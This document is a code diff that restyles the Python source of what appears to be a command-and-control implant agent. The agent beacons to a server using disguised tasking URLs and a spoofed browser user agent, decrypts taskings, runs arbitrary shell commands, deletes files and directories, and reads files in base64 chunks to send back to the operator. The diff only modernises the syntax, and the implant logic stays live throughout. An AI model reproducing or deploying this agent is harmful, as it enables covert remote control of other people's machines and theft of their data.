@@ -42,7 +42,8 @@ from threading import Thread
 #   tasking uris | user agent | additional header 1 | additional header 2 | ...
 profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
 
-if server.endswith("/"): server = server[0:-1]
+if server.endswith("/"):
+    server = server[:-1]
 
 delay = 60
 jitter = 0.0
@@ -115,9 +116,6 @@ def decode_routing_packet(data):
             (language, meta, additional, encData) = packet
             # if meta == 'SERVER_RESPONSE':
             process_tasking(encData)
-        else:
-            # TODO: how to handle forwarding on other agent routing packets?
-            pass
 
 
 def build_response_packet(taskingID, packetData, resultID=0):
@@ -202,27 +200,24 @@ def process_tasking(data):
         # aes_decrypt_and_verify is in stager.py
         tasking = aes_decrypt_and_verify(key, data)
         (packetType, totalPacket, packetNum, resultID, length, data, remainingData) = parse_task_packet(tasking)
-        
+
         # if we get to this point, we have a legit tasking so reset missedCheckins
         missedCheckins = 0
 
         # execute/process the packets and get any response
         resultPackets = ""
-        result = process_packet(packetType, data, resultID)
-
-        if result:
+        if result := process_packet(packetType, data, resultID):
             resultPackets += result
 
         packetOffset = 12 + length
 
         while remainingData and remainingData != '':
             (packetType, totalPacket, packetNum, resultID, length, data, remainingData) = parse_task_packet(tasking, offset=packetOffset)
-            result = process_packet(packetType, data, resultID)
-            if result:
+            if result := process_packet(packetType, data, resultID):
                 resultPackets += result
 
             packetOffset += 12 + length
-        
+
         # send_message() is patched in from the listener module
         send_message(resultPackets)
 
@@ -640,8 +635,7 @@ class compress(object):
         data = string wanting compression
         cvalue = 0-9 comp value (default 6)
         '''
-        cdata = zlib.compress(data,cvalue)
-        return cdata
+        return zlib.compress(data,cvalue)
 
     def crc32_data(self, data):
         '''
@@ -650,8 +644,7 @@ class compress(object):
         returns:
         HEX bytes of data
         '''
-        crc = zlib.crc32(data) & 0xFFFFFFFF
-        return crc
+        return zlib.crc32(data) & 0xFFFFFFFF
 
     def build_header(self, data, crc):
         '''
@@ -661,8 +654,7 @@ class compress(object):
         crc = crc32 value
         '''
         header = struct.pack("!I",crc)
-        built_data = header + data
-        return built_data
+        return header + data
 
 class decompress(object):
 
@@ -694,10 +686,7 @@ class decompress(object):
             comp_crc32 = struct.unpack("!I", data[:self.CRC_HSIZE])[0]
             dec_data = zlib.decompress(data[self.CRC_HSIZE:])
             dec_crc32 = zlib.crc32(dec_data) & 0xFFFFFFFF
-            if comp_crc32 == dec_crc32:
-                crc32 = True
-            else:
-                crc32 = False
+            crc32 = comp_crc32 == dec_crc32
             return { "header_crc32" : comp_crc32, "dec_crc32" : dec_crc32, "crc32_check" : crc32, "data" : dec_data }
         else:
             dec_data = zlib.decompress(data)
@@ -758,15 +747,11 @@ class KThread(threading.Thread):
         self.run = self.__run_backup
 
     def globaltrace(self, frame, why, arg):
-        if why == 'call':
-            return self.localtrace
-        else:
-            return None
+        return self.localtrace if why == 'call' else None
 
     def localtrace(self, frame, why, arg):
-        if self.killed:
-            if why == 'line':
-                raise SystemExit()
+        if self.killed and why == 'line':
+            raise SystemExit()
         return self.localtrace
 
     def kill(self):
@@ -806,7 +791,7 @@ def job_func():
         result = build_response_packet(110, str(dataStats_2))
         process_job_tasking(result)
     except Exception as e:
-        p = "error executing specified Python job data: " + str(e)
+        p = f'error executing specified Python job data: {str(e)}'
         result = build_response_packet(0, p)
         process_job_tasking(result)
 
@@ -832,8 +817,6 @@ def send_job_message_buffer():
     if len(jobs) > 0:
         result = get_job_message_buffer()
         process_job_tasking(result)
-    else:
-        pass
 
 def start_webserver(data, ip, port, serveCount):
     # thread data_webserver for execution
@@ -871,14 +854,11 @@ def data_webserver(data, ip, port, serveCount):
 def permissions_to_unix_name(st_mode):
     permstr = ''
     usertypes = ['USR', 'GRP', 'OTH']
+    perm_types = ['R', 'W', 'X']
     for usertype in usertypes:
-        perm_types = ['R', 'W', 'X']
         for permtype in perm_types:
             perm = getattr(stat, 'S_I%s%s' % (permtype, usertype))
-            if st_mode & perm:
-                permstr += permtype.lower()
-            else:
-                permstr += '-'
+            permstr += permtype.lower() if st_mode & perm else '-'
     return permstr
 
 def directory_listing(path):
@@ -890,11 +870,7 @@ def directory_listing(path):
         fstat = os.stat(os.path.join(path, fn))
         permstr = permissions_to_unix_name(fstat[0])
 
-        if os.path.isdir(fn):
-            permstr = "d{}".format(permstr)
-        else:
-            permstr = "-{}".format(permstr)
-
+        permstr = "d{}".format(permstr) if os.path.isdir(fn) else "-{}".format(permstr)
         user = pwd.getpwuid(fstat.st_uid)[0]
         group = grp.getgrgid(fstat.st_gid)[0]
 
@@ -919,7 +895,7 @@ def directory_listing(path):
 def run_command(command, cmdargs=None):
     
     if re.compile("(ls|dir)").match(command):
-        if cmdargs == None or not os.path.exists(cmdargs):
+        if cmdargs is None or not os.path.exists(cmdargs):
             cmdargs = '.'
 
         return directory_listing(cmdargs)
@@ -927,22 +903,21 @@ def run_command(command, cmdargs=None):
     elif re.compile("pwd").match(command):
         return str(os.getcwd())
     elif re.compile("rm").match(command):
-        if cmdargs == None:
+        if cmdargs is None:
             return "please provide a file or directory"
-        
-        if os.path.exists(cmdargs):
-            if os.path.isfile(cmdargs):
-                os.remove(cmdargs)
-                return "done."
-            elif os.path.isdir(cmdargs):
-                shutil.rmtree(cmdargs)
-                return "done."
-            else:
-                return "unsupported file type"
-        else:
+
+        if not os.path.exists(cmdargs):
             return "specified file/directory does not exist"
+        if os.path.isfile(cmdargs):
+            os.remove(cmdargs)
+            return "done."
+        elif os.path.isdir(cmdargs):
+            shutil.rmtree(cmdargs)
+            return "done."
+        else:
+            return "unsupported file type"
     elif re.compile("mkdir").match(command):
-        if cmdargs == None:
+        if cmdargs is None:
             return "please provide a directory"
 
         os.mkdir(cmdargs)
@@ -957,7 +932,7 @@ def run_command(command, cmdargs=None):
     else:
         if cmdargs != None:
             command = "{} {}".format(command,cmdargs)
-        
+
         p = subprocess.Popen(command, stdin=None, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
         return p.communicate()[0].strip()
 
@@ -966,14 +941,10 @@ def get_file_part(filePath, offset=0, chunkSize=512000, base64=True):
     if not os.path.exists(filePath):
         return ''
 
-    f = open(filePath, 'rb')
-    f.seek(offset, 0)
-    data = f.read(chunkSize)
-    f.close()
-    if base64:
-        return base64.b64encode(data)
-    else:
-        return data
+    with open(filePath, 'rb') as f:
+        f.seek(offset, 0)
+        data = f.read(chunkSize)
+    return base64.b64encode(data) if base64 else data
 
 ################################################
 #
